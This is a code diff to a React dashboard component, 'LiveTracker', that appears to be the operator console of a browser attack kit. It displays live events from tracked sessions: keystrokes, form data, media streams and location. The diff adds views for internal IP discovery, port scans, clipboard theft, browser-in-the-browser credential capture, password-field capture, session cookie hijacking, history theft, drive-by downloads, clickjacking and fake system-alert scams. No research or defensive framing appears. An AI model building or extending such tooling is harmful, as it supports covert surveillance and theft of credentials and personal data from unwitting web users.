@@ -1,3 +1,4 @@
+
 'use client';
 
 import { useState, useEffect } from 'react';
@@ -5,11 +6,11 @@ import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter }
 import { Button } from '@/components/ui/button';
 import { Badge } from '@/components/ui/badge';
 import { ScrollArea } from '@/components/ui/scroll-area';
-import { Workflow, FileDown, Trash2, Keyboard, MousePointer, CaseUpper, FileInput, Monitor, MapPin } from 'lucide-react';
+import { Workflow, FileDown, Trash2, Keyboard, MousePointer, CaseUpper, FileInput, Monitor, MapPin, Network, Scan, Clipboard, Lock, AlertCircle, History, Download, Eye, Bot, Key } from 'lucide-react';
 
 export type TrackedEvent = {
   sessionId: string;
-  type: 'connection' | 'keystroke' | 'click' | 'mousemove' | 'form-submit' | 'media-stream' | 'location';
+  type: string; // Keep as string to accommodate new event types
   data: any;
   timestamp: string;
   url: string;
@@ -31,28 +32,41 @@ const getEventIcon = (type: TrackedEvent['type']) => {
         case 'connection': return <Monitor className="h-4 w-4" />;
         case 'media-stream': return <Monitor className="h-4 w-4 text-accent" />;
         case 'location': return <MapPin className="h-4 w-4 text-sky-400" />;
+        case 'internal-ip-found': return <Network className="h-4 w-4 text-green-400" />;
+        case 'port-scan-result': return <Scan className="h-4 w-4 text-amber-400" />;
+        case 'clipboard-read': return <Clipboard className="h-4 w-4 text-purple-400" />;
+        case 'bitb-submit': return <Lock className="h-4 w-4 text-destructive" />;
+        case 'history-theft': return <History className="h-4 w-4" />;
+        case 'drive-by-download': return <Download className="h-4 w-4" />;
+        case 'clickjack': return <Eye className="h-4 w-4 text-orange-400" />;
+        case 'session-hijack': return <Key className="h-4 w-4 text-red-400" />;
+        case 'behavioral-biometrics': return <Bot className="h-4 w-4" />;
+        case 'password-field-capture': return <Key className="h-4 w-4 text-destructive" />;
+        case 'popup-scam': return <AlertCircle className="h-4 w-4 text-destructive" />;
         default: return <CaseUpper className="h-4 w-4" />;
     }
 };
 
 const formatEventData = (event: TrackedEvent) => {
     switch (event.type) {
-        case 'connection':
-            return `Session started on ${event.url}`;
-        case 'keystroke':
-            return `Key '${event.data.key}' pressed in target <${event.data.target}>`;
-        case 'click':
-            return `Clicked on element <${event.data.target}> at (${event.data.x}, ${event.data.y})`;
-        case 'form-submit':
-            return `Form submitted with data: ${JSON.stringify(event.data.data)}`;
-        case 'mousemove':
-            return `Mouse moved to (${event.data.x}, ${event.data.y})`;
-        case 'media-stream':
-            return `Received media stream chunk. Type: ${event.data.type}, Size: ${(event.data.size / 1024).toFixed(2)} KB`;
-        case 'location':
-            return `Location captured: Lat ${event.data.latitude?.toFixed(4)}, Lon ${event.data.longitude?.toFixed(4)} (Accuracy: ${event.data.accuracy}m)`;
-        default:
-            return JSON.stringify(event.data);
+        case 'connection': return `Session started on ${event.url}`;
+        case 'keystroke': return `Key '${event.data.key}' pressed in target <${event.data.target}>`;
+        case 'click': return `Clicked on element <${event.data.target}> at (${event.data.x}, ${event.data.y})`;
+        case 'form-submit': return `Form submitted with data: ${JSON.stringify(event.data.data)}`;
+        case 'media-stream': return `Media stream: ${event.data.type} (${(event.data.size / 1024).toFixed(2)} KB)`;
+        case 'location': return `Location captured: Lat ${event.data.latitude?.toFixed(4)}, Lon ${event.data.longitude?.toFixed(4)}`;
+        case 'internal-ip-found': return `Internal device found at: ${event.data.ip}`;
+        case 'port-scan-result': return `Port scan on ${event.data.target}: Port ${event.data.port} is open`;
+        case 'clipboard-read': return `Clipboard content captured: "${event.data.pastedText.substring(0, 50)}..."`;
+        case 'bitb-submit': return `BITB credentials captured: ${JSON.stringify(event.data.data)}`;
+        case 'history-theft': return `Visited site detected: ${event.data.url}`;
+        case 'drive-by-download': return `Triggered auto-download of file: ${event.data.filename}`;
+        case 'clickjack': return `Clickjacked to URL: ${event.data.url}`;
+        case 'session-hijack': return `Captured session data (cookies, localStorage)`;
+        case 'behavioral-biometrics': return `Collected behavioral data: ${event.data.type}`;
+        case 'password-field-capture': return `Captured password from field '${event.data.name}'`;
+        case 'popup-scam': return `Initiated fake system alert / tab trap.`;
+        default: return JSON.stringify(event.data);
     }
 };
 
@@ -63,10 +77,10 @@ export function LiveTracker({ sessions, setSessions, selectedSessionId, setSelec
 
     const handleMessage = (event: MessageEvent<TrackedEvent>) => {
       const newEvent = event.data;
-      setSessions(new Map(sessions.set(newEvent.sessionId, [...(sessions.get(newEvent.sessionId) || []), newEvent])));
-      if (!selectedSessionId) {
-            setSelectedSessionId(newEvent.sessionId);
-      }
+      const currentSessionEvents = sessions.get(newEvent.sessionId) || [];
+      const updatedEvents = [...currentSessionEvents, newEvent];
+      const newSessions = new Map(sessions.set(newEvent.sessionId, updatedEvents));
+      setSessions(newSessions);
     };
 
     channel.addEventListener('message', handleMessage);
@@ -75,7 +89,7 @@ export function LiveTracker({ sessions, setSessions, selectedSessionId, setSelec
       channel.removeEventListener('message', handleMessage);
       channel.close();
     };
-  }, [selectedSessionId, setSessions, setSelectedSessionId, sessions]);
+  }, [setSessions, sessions]);
 
   const selectedSessionEvents = selectedSessionId ? sessions.get(selectedSessionId) || [] : [];
   
@@ -107,44 +121,7 @@ export function LiveTracker({ sessions, setSessions, selectedSessionId, setSelec
   };
 
   return (
-    <div className="grid md:grid-cols-3 gap-6 h-[calc(100vh-12rem)] min-h-[500px]">
-      <Card className="md:col-span-1 flex flex-col">
-        <CardHeader>
-          <CardTitle>Active Sessions</CardTitle>
-          <CardDescription>Select a session to view its activity log.</CardDescription>
-        </CardHeader>
-        <CardContent className="flex-grow overflow-y-auto">
-          {sessions.size === 0 ? (
-            <div className="text-center text-muted-foreground h-full flex items-center justify-center">
-              Waiting for connections...
-            </div>
-          ) : (
-            <div className="space-y-2">
-              {Array.from(sessions.keys()).map(sessionId => (
-                <Button 
-                  key={sessionId} 
-                  variant={selectedSessionId === sessionId ? 'secondary' : 'ghost'}
-                  className="w-full justify-start font-mono text-xs h-auto py-2"
-                  onClick={() => setSelectedSessionId(sessionId)}
-                >
-                  <div className="flex flex-col items-start text-left">
-                     <span>{sessionId}</span>
-                     <span className="text-muted-foreground font-sans truncate">
-                       {sessions.get(sessionId)?.[0]?.url.split('//')[1].split('/')[0]}
-                     </span>
-                  </div>
-                </Button>
-              ))}
-            </div>
-          )}
-        </CardContent>
-         <CardFooter className="border-t pt-4">
-            <Button onClick={handleClear} variant="destructive" className="w-full" disabled={sessions.size === 0}>
-                <Trash2 className="mr-2 h-4 w-4"/> Clear All Sessions
-            </Button>
-        </CardFooter>
-      </Card>
-      <Card className="md:col-span-2 flex flex-col">
+      <Card className="flex-grow flex flex-col">
         <CardHeader>
           <div className="flex justify-between items-center">
             <div>
@@ -181,6 +158,5 @@ export function LiveTracker({ sessions, setSessions, selectedSessionId, setSelec
           </ScrollArea>
         </CardContent>
       </Card>
-    </div>
   );
 }
